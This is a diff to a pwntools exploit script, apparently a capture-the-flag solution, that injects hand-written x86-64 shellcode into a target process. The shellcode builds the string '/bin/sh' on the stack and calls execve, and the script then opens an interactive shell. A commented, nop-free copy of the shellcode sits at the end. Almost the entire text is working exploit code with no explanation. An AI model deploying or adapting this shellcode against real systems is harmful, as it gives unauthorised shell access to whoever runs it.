@@ -18,16 +18,54 @@ if __name__ == "__main__":
     io = start()
     shellcode = pwn.asm(
         """
-    xor eax,eax
-    inc eax
+    mov eax, 0x69622f
+    mov edx, 0x68732f6e
     nop
-
-    int 0x80
+    shl rdx, 32
+    nop
+    or  rax, rdx
+    nop
+    nop  
+    push rax
+    push rsp
+    pop rdi
     nop
     nop
     nop
+    xor eax, eax
+    nop
+    nop
+    push rax
+    mov al, 59
+    nop
+    nop
+    push rsp
+    pop rdx
+    push rsp
+    pop rsi
+    nop
+    nop
+    nop
+    syscall
     """,
         arch="amd64",
     )
     io.sendline(shellcode)
     io.interactive()
+
+#
+# mov eax, 0x69622f
+# mov edx, 0x68732f6e
+# shl rdx, 32
+# or rax, rdx
+# push rax
+# push rsp
+# pop rdi
+# xor eax, eax
+# push rax
+# mov al, 59
+# push rsp
+# pop rdx
+# push rsp
+# pop rsi
+# syscall
